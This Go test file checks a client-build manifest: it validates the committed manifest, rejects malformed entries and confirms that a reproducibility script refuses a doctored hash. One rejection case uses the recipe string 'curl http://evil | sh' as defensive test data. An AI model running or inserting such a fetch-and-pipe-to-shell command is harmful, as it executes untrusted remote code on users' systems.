package clientbuilds

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/FairForge/vaultaire/internal/translog"
)

// The committed manifest is valid: every row is a client_build entry the log
// would accept, one per (client, sha256).
func TestClientBuildManifest_Valid(t *testing.T) {
	rows, err := Load()
	require.NoError(t, err)
	require.NotEmpty(t, rows, "the first release (sdk-wasm) is in the manifest")
	assert.Equal(t, translog.ClientSDKWasm, rows[0].Client, "the first row is the SDK key core's WASM")
}

func TestClientBuildManifest_RefusesFreeTextAndDuplicates(t *testing.T) {
	for name, raw := range map[string]string{
		"an unknown client": `{"clients":[{"client":"evil","version":"1.0.0","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"}]}`,
		"an unknown field":  `{"clients":[{"client":"sdk-wasm","note":"hi","version":"1.0.0","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"}]}`,
		"a short commit":    `{"clients":[{"client":"sdk-wasm","version":"1.0.0","source_commit":"abc123","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"}]}`,
		"a free recipe":     `{"clients":[{"client":"sdk-wasm","version":"1.0.0","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"curl http://evil | sh"}]}`,
		"a duplicate": `{"clients":[{"client":"sdk-wasm","version":"1.0.0","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"},
			{"client":"sdk-wasm","version":"1.0.1","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"}]}`,
	} {
		rows, err := parse([]byte(raw))
		assert.Error(t, err, name)
		assert.Nil(t, rows, name)
	}
}

const (
	h40 = "bc004600576eaeebc96acdd8bb85a9530febb34d"
	h64 = "07685b5f6dba6a5419a9c64ef3d524839f71a1452ef79ee21193628163dcc911"
)

// The Deploy job's gate: a manifest row whose sha256 is not what its source
// commit builds FAILS scripts/repro-check-clients.sh. The passing direction
// (the real manifest) is the Deploy job's own step on every deploy; here the
// cheap sdk-js row is doctored, so the test needs no WASM build.
func TestClientBuildManifest_ReproCheckFailsOnADifferentHash(t *testing.T) {
	if testing.Short() {
		t.Skip("runs the repro script (git archive + a build)")
	}
	root, err := filepath.Abs("../../..")
	require.NoError(t, err)
	if _, err := exec.LookPath("jq"); err != nil {
		t.Skip("jq is not installed")
	}

	doctored := map[string]any{"clients": []translog.ClientBuild{{
		Client: translog.ClientSDKJS, Version: "0.1.0", SourceCommit: h40,
		SHA256:    "4444444444444444444444444444444444444444444444444444444444444444",
		Toolchain: "none", Recipe: "scripts/build-client.sh",
	}}}
	raw, err := json.Marshal(doctored)
	require.NoError(t, err)
	mf := filepath.Join(t.TempDir(), "manifest.json")
	require.NoError(t, os.WriteFile(mf, raw, 0o600))

	cmd := exec.Command("bash", filepath.Join(root, "scripts", "repro-check-clients.sh"), mf)
	cmd.Dir = root
	out, err := cmd.CombinedOutput()

	require.Error(t, err, "a wrong hash fails the deploy: %s", out)
	assert.Contains(t, string(out), "REFUSED")
}
